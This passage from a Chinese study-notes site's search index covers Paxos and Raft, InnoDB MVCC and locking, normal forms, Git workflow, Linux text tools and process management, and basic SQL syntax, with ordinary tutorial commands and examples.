v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 \u0026gt; n2，那么就丢弃该提议请求；否则，发送 Prepare 响应，该 Prepare 响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。\n如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的 Prepare 请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n \u0026gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的 Prepare 请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 \u0026lt;= 4，因此就发送 [n=2, v=8] 的 Prepare 响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。\n2. Accept 阶段 # 当一个 Proposer 接收到超过一半 Acceptor 的 Prepare 响应时，就可以发送 Accept 请求。\nProposer A 接收到两个 Prepare 响应之后，就发送 [n=2, v=8] Accept 请求。该 Accept 请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。\nProposer B 过后也收到了两个 Prepare 响应，因此也开始发送 Accept 请求。需要注意的是，Accept 请求的 v 需要取它收到的最大提议编号对应的 v 值，也就是 8。因此它发送 [n=4, v=8] 的 Accept 请求。\n3. Learn 阶段 # Acceptor 接收到 Accept 请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送 Learn 提议给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。\n约束条件 # 1. 正确性 # 指只有一个提议值会生效。\n因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。\n2. 可终止性 # 指最后总会有一个提议生效。\nPaxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。\n六、Raft # Raft 也是分布式一致性协议，主要是用来竞选主节点。\nRaft: Understandable Distributed Consensus 单个 Candidate 的竞选 # 有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。\n下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。 此时 Node A 发送投票请求给其它所有节点。 其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。 之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。 多个 Candidate 竞选 # 如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。 由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。 数据同步 # 来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。 Leader 会把修改复制到所有 Follower。 Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。 此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。 参考 # 倪超. 从 Paxos 到 ZooKeeper : 分布式一致性原理与实践 [M]. 电子工业出版社, 2015. Distributed locks with Redis 浅谈分布式锁 基于 Zookeeper 的分布式锁 聊聊分布式事务，再说说解决方案 分布式系统的事务处理 深入理解分布式事务 What is CAP theorem in distributed database system? NEAT ALGORITHMS - PAXOS Paxos By Example "},{"id":13,"href":"/keeplearning/docs/mysql/dbs-theory2/","title":"数据库系统原理（二）","section":"MySQL","content":" 数据库系统原理（二） # 五、多版本并发控制 # 多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，要求很低，无需使用 MVCC。可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。\n基本思想 # 在封锁一节中提到，加锁能解决多个事务同时执行时出现的并发一致性问题。在实际场景中读操作往往多于写操作，因此又引入了读写锁来避免不必要的加锁操作，例如读和读没有互斥关系。读写锁中读和写操作仍然是互斥的，而 MVCC 利用了多版本的思想，写操作更新最新的版本快照，而读操作去读旧版本快照，没有互斥关系，这一点和 CopyOnWrite 类似。\n在 MVCC 中事务的修改操作（DELETE、INSERT、UPDATE）会为数据行新增一个版本快照。\n脏读和不可重复读最根本的原因是事务读取到其它事务未提交的修改。在事务进行读取操作时，为了解决脏读和不可重复读问题，MVCC 规定只能读取已经提交的快照。当然一个事务可以读取自身未提交的快照，这不算是脏读。\n版本号 # 系统版本号 SYS_ID：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。 事务版本号 TRX_ID ：事务开始时的系统版本号。 Undo 日志 # MVCC 的多版本指的是多个版本的快照，快照存储在 Undo 日志中，该日志通过回滚指针 ROLL_PTR 把一个数据行的所有快照连接起来。\n例如在 MySQL 创建一个表 t，包含主键 id 和一个字段 x。我们先插入一个数据行，然后对该数据行执行两次更新操作。\nINSERT INTO t(id, x) VALUES(1, \u0026#34;a\u0026#34;); UPDATE t SET x=\u0026#34;b\u0026#34; WHERE id=1; UPDATE t SET x=\u0026#34;c\u0026#34; WHERE id=1; 因为没有使用 START TRANSACTION 将上面的操作当成一个事务来执行，根据 MySQL 的 AUTOCOMMIT 机制，每个操作都会被当成一个事务来执行，所以上面的操作总共涉及到三个事务。快照中除了记录事务版本号 TRX_ID 和操作之外，还记录了一个 bit 的 DEL 字段，用于标记是否被删除。\nINSERT、UPDATE、DELETE 操作会创建一个日志，并将事务版本号 TRX_ID 写入。DELETE 可以看成是一个特殊的 UPDATE，还会额外将 DEL 字段设置为 1。\nReadView # MVCC 维护了一个 ReadView 结构，主要包含了当前系统未提交的事务列表 TRX_IDs {TRX_ID_1, TRX_ID_2, \u0026hellip;}，还有该列表的最小值 TRX_ID_MIN 和 TRX_ID_MAX。\n在进行 SELECT 操作时，根据数据行快照的 TRX_ID 与 TRX_ID_MIN 和 TRX_ID_MAX 之间的关系，从而判断数据行快照是否可以使用：\nTRX_ID \u0026lt; TRX_ID_MIN，表示该数据行快照时在当前所有未提交事务之前进行更改的，因此可以使用。\nTRX_ID \u0026gt; TRX_ID_MAX，表示该数据行快照是在事务启动之后被更改的，因此不可使用。\nTRX_ID_MIN \u0026lt;= TRX_ID \u0026lt;= TRX_ID_MAX，需要根据隔离级别再进行判断：\n提交读：如果 TRX_ID 在 TRX_IDs 列表中，表示该数据行快照对应的事务还未提交，则该快照不可使用。否则表示已经提交，可以使用。 可重复读：都不可以使用。因为如果可以使用的话，那么其它事务也可以读到这个数据行快照并进行修改，那么当前事务再去读这个数据行得到的值就会发生改变，也就是出现了不可重复读问题。 在数据行快照不可使用的情况下，需要沿着 Undo Log 的回滚指针 ROLL_PTR 找到下一个快照，再进行上面的判断。\n快照读与当前读 # 1. 快照读 # MVCC 的 SELECT 操作是快照中的数据，不需要进行加锁操作。\nSELECT * FROM table ...; 2. 当前读 # MVCC 其它会对数据库进行修改的操作（INSERT、UPDATE、DELETE）需要进行加锁操作，从而读取最新的数据。可以看到 MVCC 并不是完全不用加锁，而只是避免了 SELECT 的加锁操作。\nINSERT; UPDATE; DELETE; 在进行 SELECT 操作时，可以强制指定进行加锁操作。以下第一个语句需要加 S 锁，第二个需要加 X 锁。\nSELECT * FROM table WHERE ? lock in share mode; SELECT * FROM table WHERE ? for update; 六、Next-Key Locks # Next-Key Locks 是 MySQL 的 InnoDB 存储引擎的一种锁实现。\nMVCC 不能解决幻影读问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 MVCC + Next-Key Locks 可以解决幻读问题。\nRecord Locks # 锁定一个记录上的索引，而不是记录本身。\n如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚簇索引，因此 Record Locks 依然可以使用。\nGap Locks # 锁定索引之间的间隙，但是不包含索引本身。例如当一个事务执行以下语句，其它事务就不能在 t.c 中插入 15。\nSELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATE; Next-Key Locks # 它是 Record Locks 和 Gap Locks 的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙。它锁定一个前开后闭区间，例如一个索引包含以下值：10, 11, 13, and 20，那么就需要锁定以下区间：\n(-∞, 10] (10, 11] (11, 13] (13, 20] (20, +∞) 七、关系数据库设计理论 # 函数依赖 # 记 A-\u0026gt;B 表示 A 函数决定 B，也可以说 B 函数依赖于 A。\n如果 {A1，A2，\u0026hellip; ，An} 是关系的一个或多个属性的集合，该集合函数决定了关系的其它所有属性并且是最小的，那么该集合就称为键码。\n对于 A-\u0026gt;B，如果能找到 A 的真子集 A\u0026rsquo;，使得 A\u0026rsquo;-\u0026gt; B，那么 A-\u0026gt;B 就是部分函数依赖，否则就是完全函数依赖。\n对于 A-\u0026gt;B，B-\u0026gt;C，则 A-\u0026gt;C 是一个传递函数依赖。\n异常 # 以下的学生课程关系的函数依赖为 {Sno, Cname} -\u0026gt; {Sname, Sdept, Mname, Grade}，键码为 {Sno, Cname}。也就是说，确定学生和课程之后，就能确定其它信息。\nSno Sname Sdept Mname Cname Grade 1 学生-1 学院-1 院长-1 课程-1 90 2 学生-2 学院-2 院长-2 课程-2 80 2 学生-2 学院-2 院长-2 课程-1 100 3 学生-3 学院-2 院长-2 课程-2 95 不符合范式的关系，会产生很多异常，主要有以下四种异常：\n冗余数据：例如 学生-2 出现了两次。 修改异常：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。 删除异常：删除一个信息，那么也会丢失其它信息。例如删除了 课程-1 需要删除第一行和第三行，那么 学生-1 的信息就会丢失。 插入异常：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。 范式 # 范式理论是为了解决以上提到四种异常。\n高级别范式的依赖于低级别的范式，1NF 是最低级别的范式。\n1. 第一范式 (1NF) # 属性不可分。\n2. 第二范式 (2NF) # 每个非主属性完全函数依赖于键码。\n可以通过分解来满足。\n分解前 Sno Sname Sdept Mname Cname Grade 1 学生-1 学院-1 院长-1 课程-1 90 2 学生-2 学院-2 院长-2 课程-2 80 2 学生-2 学院-2 院长-2 课程-1 100 3 学生-3 学院-2 院长-2 课程-2 95 以上学生课程关系中，{Sno, Cname} 为键码，有如下函数依赖：\nSno -\u0026gt; Sname, Sdept Sdept -\u0026gt; Mname Sno, Cname-\u0026gt; Grade Grade 完全函数依赖于键码，它没有任何冗余数据，每个学生的每门课都有特定的成绩。\nSname, Sdept 和 Mname 都部分依赖于键码，当一个学生选修了多门课时，这些数据就会出现多次，造成大量冗余数据。\n分解后 关系-1\nSno Sname Sdept Mname 1 学生-1 学院-1 院长-1 2 学生-2 学院-2 院长-2 3 学生-3 学院-2 院长-2 有以下函数依赖：\nSno -\u0026gt; Sname, Sdept Sdept -\u0026gt; Mname 关系-2\nSno Cname Grade 1 课程-1 90 2 课程-2 80 2 课程-1 100 3 课程-2 95 有以下函数依赖：\nSno, Cname -\u0026gt; Grade 3. 第三范式 (3NF) # 非主属性不传递函数依赖于键码。\n上面的 关系-1 中存在以下传递函数依赖：\nSno -\u0026gt; Sdept -\u0026gt; Mname 可以进行以下分解：\n关系-11\nSno Sname Sdept 1 学生-1 学院-1 2 学生-2 学院-2 3 学生-3 学院-2 关系-12\nSdept Mname 学院-1 院长-1 学院-2 院长-2 八、ER 图 # Entity-Relationship，有三个组成部分：实体、属性、联系。\n用来进行关系型数据库系统的概念设计。\n实体的三种联系 # 包含一对一，一对多，多对多三种。\n如果 A 到 B 是一对多关系，那么画个带箭头的线段指向 B； 如果是一对一，画两个带箭头的线段； 如果是多对多，画两个不带箭头的线段。 下图的 Course 和 Student 是一对多的关系。\n表示出现多次的关系 # 一个实体在联系出现几次，就要用几条线连接。\n下图表示一个课程的先修关系，先修关系出现两个 Course 实体，第一个是先修课程，后一个是后修课程，因此需要用两条线来表示这种关系。\n联系的多向性 # 虽然老师可以开设多门课，并且可以教授多名学生，但是对于特定的学生和课程，只有一个老师教授，这就构成了一个三元联系。\n表示子类 # 用一个三角形和两条线来连接类和子类，与子类有关的属性和联系都连到子类上，而与父类和子类都有关的连到父类上。\n参考资料 # AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, 等. 数据库系统概念 [M]. 机械工业出版社, 2006. 施瓦茨. 高性能 MYSQL(第3版)[M]. 电子工业出版社, 2013. 史嘉权. 数据库系统概论[M]. 清华大学出版社有限公司, 2006. The InnoDB Storage Engine Transaction isolation levels Concurrency Control The Nightmare of Locking, Blocking and Isolation Levels! Database Normalization and Normal Forms with an Example The basics of the InnoDB undo logging and history system MySQL locking for the busy web developer 浅入浅出 MySQL 和 InnoDB Innodb 中的事务隔离级别和锁的关系 "},{"id":14,"href":"/keeplearning/docs/network/physical-layer/","title":"物理层","section":"网络","content":" 物理层 # 通信方式 # 根据信息在传输线上的传送方向，分为以下三种通信方式：\n单工通信：单向传输 半双工通信：双向交替传输 全双工通信：双向同时传输 带通调制 # 模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。\n"},{"id":15,"href":"/keeplearning/docs/coding-practice/git/","title":"Git","section":"编码实践","content":" Git # 集中式与分布式 # Git 属于分布式版本控制系统，而 SVN 属于集中式。\n集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。\n集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。\n集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。\n分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。\n中心服务器 # 中心服务器用来交换每个用户的修改，没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。\nGithub 就是一个中心服务器。\n工作流 # 新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。\nGit 的版本库有一个称为 Stage 的暂存区以及最后的 History 版本库，History 存储所有分支信息，使用一个 HEAD 指针指向当前分支。\ngit add files 把文件的修改添加到暂存区 git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了 git reset \u0026ndash; files 使用当前分支上的修改覆盖暂存区，用来撤销最后一次 git add files git checkout \u0026ndash; files 使用暂存区的修改覆盖工作目录，用来撤销本地修改 可以跳过暂存区域直接从分支中取出修改，或者直接提交修改到分支中。\ngit commit -a 直接把所有文件的修改添加到暂存区然后执行提交 git checkout HEAD \u0026ndash; files 取出最后一次修改，可以用来进行回滚操作 分支实现 # 使用指针将每个提交连接成一条时间线，HEAD 指针指向当前分支指针。\n新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支，表示新分支成为当前分支。\n每次提交只会让当前分支指针向前移动，而其它分支指针不会移动。\n合并分支也只需要改变指针即可。\n冲突 # 当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。\nGit 会使用 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; ，======= ，\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。\n\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD Creating a new branch is quick \u0026amp; simple. ======= Creating a new branch is quick AND simple. \u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; feature1 Fast forward # \u0026ldquo;快进式合并\u0026rdquo;（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。\n可以在合并时加上 \u0026ndash;no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。\n$ git merge --no-ff -m \u0026#34;merge with no-ff\u0026#34; dev 储藏（Stashing） # 在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。\n可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈中，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。\n$ git stash Saved working directory and index state \\ \u0026#34;WIP on master: 049d078 added the index file\u0026#34; HEAD is now at 049d078 added the index file (To restore them type \u0026#34;git stash apply\u0026#34;) 该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。\nSSH 传输设置 # Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。\n如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key：\n$ ssh-keygen -t rsa -C \u0026#34;youremail@example.com\u0026#34; 然后把公钥 id_rsa.pub 的内容复制到 Github \u0026ldquo;Account settings\u0026rdquo; 的 SSH Keys 中。\n.gitignore 文件 # 忽略以下文件：\n操作系统自动生成的文件，比如缩略图； 编译生成的中间文件，比如 Java 编译产生的 .class 文件； 自己的敏感信息，比如存放口令的配置文件。 不需要全部自己编写，可以到 https://github.com/github/gitignore 中进行查询。\nGit 命令一览 # 比较详细的地址：http://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf\n参考资料 # Git - 简明指南 图解 Git 廖雪峰 : Git 教程 Learn Git Branching "},{"id":16,"href":"/keeplearning/docs/linux/linux3/","title":"Linux（三）","section":"Linux","content":" Linux（三） # 正则表达式 # grep # g/re/p（globally search a regular expression and print)，使用正则表示式进行全局查找并打印。\n$ grep [-acinv] [--color=auto] 搜寻字符串 filename -c ： 统计匹配到行的个数 -i ： 忽略大小写 -n ： 输出行号 -v ： 反向选择，也就是显示出没有 搜寻字符串 内容的那一行 --color=auto ：找到的关键字加颜色显示 示例：把含有 the 字符串的行提取出来（注意默认会有 \u0026ndash;color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串）\n$ grep -n \u0026#39;the\u0026#39; regular_express.txt 8:I can\u0026#39;t finish the test. 12:the symbol \u0026#39;*\u0026#39; is represented as start. 15:You are the best is mean you are the no. 1. 16:The world Happy is the same with \u0026#34;glad\u0026#34;. 18:google is the best tools for search keyword 示例：正则表达式 a{m,n} 用来匹配字符 a m~n 次，这里需要将 { 和 } 进行转义，因为它们在 shell 是有特殊意义的。\n$ grep -n \u0026#39;a\\{2,5\\}\u0026#39; regular_express.txt printf # 用于格式化输出。它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。\n$ printf \u0026#39;%10s %5i %5i %5i %8.2f \\n\u0026#39; $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33 awk # 是由 Alfred Aho，Peter Weinberger 和 Brian Kernighan 创造，awk 这个名字就是这三个创始人名字的首字母。\nawk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：$n，n 为字段号，从 1 开始，$0 表示一整行。\n示例：取出最近五个登录用户的用户名和 IP。首先用 last -n 5 取出用最近五个登录用户的所有信息，可以看到用户名和 IP 分别在第 1 列和第 3 列，我们用 $1 和 $3 就能取出这两个字段，然后用 print 进行打印。\n$ last -n 5 dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22) dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12) dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14) dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15) $ last -n 5 | awk \u0026#39;{print $1 \u0026#34;\\t\u0026#34; $3}\u0026#39; dmtsai 192.168.1.100 dmtsai 192.168.1.100 dmtsai 192.168.1.100 dmtsai 192.168.1.100 dmtsai Fri 可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。\n$ awk \u0026#39;条件类型 1 {动作 1} 条件类型 2 {动作 2} ...\u0026#39; filename 示例：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。\n$ cat /etc/passwd | awk \u0026#39;BEGIN {FS=\u0026#34;:\u0026#34;} $3 \u0026lt; 10 {print $1 \u0026#34;\\t \u0026#34; $3}\u0026#39; root 0 bin 1 daemon 2 awk 变量：\n变量名称 代表意义 NF 每一行拥有的字段总数 NR 目前所处理的是第几行数据 FS 目前的分隔字符，默认是空格键 示例：显示正在处理的行号以及每一行有多少字段\n$ last -n 5 | awk \u0026#39;{print $1 \u0026#34;\\t lines: \u0026#34; NR \u0026#34;\\t columns: \u0026#34; NF}\u0026#39; dmtsai lines: 1 columns: 10 dmtsai lines: 2 columns: 10 dmtsai lines: 3 columns: 10 dmtsai lines: 4 columns: 10 dmtsai lines: 5 columns: 9 进程管理 # 查看进程 # 1. ps # 查看某个时间点的进程信息。\n示例：查看自己的进程\n## ps -l 示例：查看系统所有进程\n## ps aux 示例：查看特定的进程\n## ps aux | grep threadx 2. pstree # 查看进程树。\n示例：查看所有进程树\n## pstree -A 3. top # 实时显示进程信息。\n示例：两秒钟刷新一次\n## top -d 2 4. netstat # 查看占用端口的进程\n示例：查看特定端口的进程\n## netstat -anp | grep port 进程状态 # 状态 说明 R running or runnable (on run queue) 正在执行或者可执行，此时进程位于执行队列中。 D uninterruptible sleep (usually I/O) 不可中断阻塞，通常为 IO 阻塞。 S interruptible sleep (waiting for an event to complete) 可中断阻塞，此时进程正在等待某个事件完成。 Z zombie (terminated but not reaped by its parent) 僵死，进程已经终止但是尚未被其父进程获取信息。 T stopped (either by a job control signal or because it is being traced) 结束，进程既可以被作业控制信号结束，也可能是正在被追踪。 SIGCHLD # 当一个子进程改变了它的状态时（停止运行，继续运行或者退出），有两件事会发生在父进程中：\n得到 SIGCHLD 信号； waitpid() 或者 wait() 调用会返回。 其中子进程发送的 SIGCHLD 信号包含了子进程的信息，比如进程 ID、进程状态、进程使用 CPU 的时间等。\n在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息，父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。\nwait() # pid_t wait(int *status) 父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。\n如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时 errno 被置为 ECHILD。\n参数 status 用来保存被收集的子进程退出时的一些状态，如果对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为 NULL。\nwaitpid() # pid_t waitpid(pid_t pid, int *status, int options) 作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。\npid 参数指示一个子进程的 ID，表示只关心这个子进程退出的 SIGCHLD 信号。如果 pid=-1 时，那么和 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。\noptions 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。\n孤儿进程 # 一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。\n孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。\n由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。\n僵尸进程 # 一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。\n僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。\n系统所能使用的进程号是有限的，如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。\n要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时僵尸进程就会变成孤儿进程，从而被 init 进程所收养，这样 init 进程就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。\n"},{"id":17,"href":"/keeplearning/docs/mysql/sql-grammar/","title":"SQL 语法","section":"MySQL","content":" SQL 语法 # 基础 # 模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。\n主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。\nSQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。\nSQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。\nSQL 支持以下三种注释：\n-- 注释 SELECT * FROM mytable; -- 注释 /* 注释1 注释2 */ 数据库创建与使用：\nCREATE DATABASE test; USE test; 创建表 # CREATE TABLE mytable ( -- int 类型，不为空，自增 id INT NOT NULL AUTO_INCREMENT, -- int 类型，不可为空，默认值为 1，不为空 col1 INT NOT NULL DEFAULT 1, -- 变长字符串类型，最长为 45 个字符，可以为空 col2 VARCHAR(45) NULL, -- 日期类型，可为空 col3 DATE NULL, -- 设置主键为 id PRIMARY KEY (`id`)); 修改表 # 添加列\nALTER TABLE mytable ADD col CHAR(20); 删除列\nALTER TABLE mytable DROP COLUMN col; 删除表\nDROP TABLE mytable; 插入 # 普通插入\nINSERT INTO mytable(col1, col2) VALUES(val1, val2); 插入检索出来的数据\nINSERT INTO mytable1(col1, col2) SELECT col1, col2 FROM mytable2; 将一个表的内容插入到一个新表\nCREATE TABLE newtable AS SELECT * FROM mytable; 更新 # UPDATE mytable SET col = val WHERE id = 1; 删除 # DELETE FROM mytable WHERE id = 1; TRUNCATE TABLE 可以清空表，也就是删除所有行。\nTRUNCATE TABLE mytable; 使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。\n查询 # DISTINCT # 相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。\nSELECT DISTINCT col1, col2 FROM mytable; LIMIT # 限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。\n返回前 5 行：\nSELECT * FROM mytable LIMIT 5; SELECT * FROM mytable LIMIT 0, 5; 返回第 3 ~ 5 行：\nSELECT * FROM mytable LIMIT 2, 3; 排序 # ASC ：升序（默认） DESC ：降序 可以按多个列进行排序，并且为每个列指定不同的排序方式：\nSELECT * FROM mytable ORDER BY col1 DESC, col2 ASC; 过滤 # 不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。\nSELECT * FROM mytable WHERE col IS NULL; 下表显示了 WHERE 子句可用的操作符\n操作符 说明 = 等于 \u0026lt; 小于 \u0026gt; 大于 \u0026lt;\u0026gt; , != 不等于 \u0026lt;= , !\u0026gt; 小于等于 \u0026gt;= , !\u0026lt; 大于等于 BETWEEN 在两个值之间 IS NULL 为 NULL 值 应该注意到，NULL 与 0、空字符串都不同。\nAND 和 OR 用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。\nIN 操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。\nNOT 操作符用于否定一个条件。\n通配符 # 通配符也是用在过滤语句中，但它只能用于文本字段。\n% 匹配 \u0026gt;=0 个任意字符；\n_ 匹配 ==1 个任意字符；\n[] 可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。\n使用 Like 来进行通配符匹配。\nSELECT * FROM mytable WHERE col LIKE \u0026#39;[^AB]%\u0026#39;; -- 不以 A 和 B 开头的任意文本 不要滥用通配符，通配符位于开头处匹配会非常慢。\n计算字段 # 在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。\n计算字段通常需要使用 AS 来取别名，否则输出的时候字段名为计算表达式。\nSELECT col1 * col2 AS alias FROM mytable; CONCAT() 用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 TRIM() 可以去除首尾空格。\nSELECT CONCAT(TRIM(col1), \u0026#39;(\u0026#39;, TRIM(col2), \u0026#39;)\u0026#39;) AS concat_col FROM mytable; 函数 # 各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。\n汇总 # 函 数 说 明 AVG() 返回某列的平均值 COUNT() 返回某列的行数 MAX() 返回某列的最大值 MIN() 返回某列的最小值 SUM() 返回某列值之和 AVG() 会忽略 NULL 行。\n使用 DISTINCT 可以汇总不同的值。\nSELECT AVG(DISTINCT col1) AS avg_col FROM mytable; 文本处理 # 函数 说明 LEFT() 左边的字符 RIGHT() 右边的字符 LOWER() 转换为小写字符 UPPER() 转换为大写字符 LTRIM() 去除左边的空格 RTRIM() 去除右边的空格 LENGTH() 长度 SOUNDEX() 转换为语音值 其中， SOUNDEX() 可以将一个字符串转换为描述其语音表示的字母数字模式。\nSELECT * FROM mytable WHERE SOUNDEX(col1) = SOUNDEX(\u0026#39;apple\u0026#39;) 日期和时间处理 # 日期格式：YYYY-MM-DD 时间格式：HH:MM:SS 函 数 说 明 ADDDATE() 增加一个日期（天、周等） ADDTIME() 增加一个时间（时、分等） CURDATE() 返回当前日期 CURTIME() 返回当前时间 DATE() 返回日期时间的日期部分 DATEDIFF() 计算两个日期之差 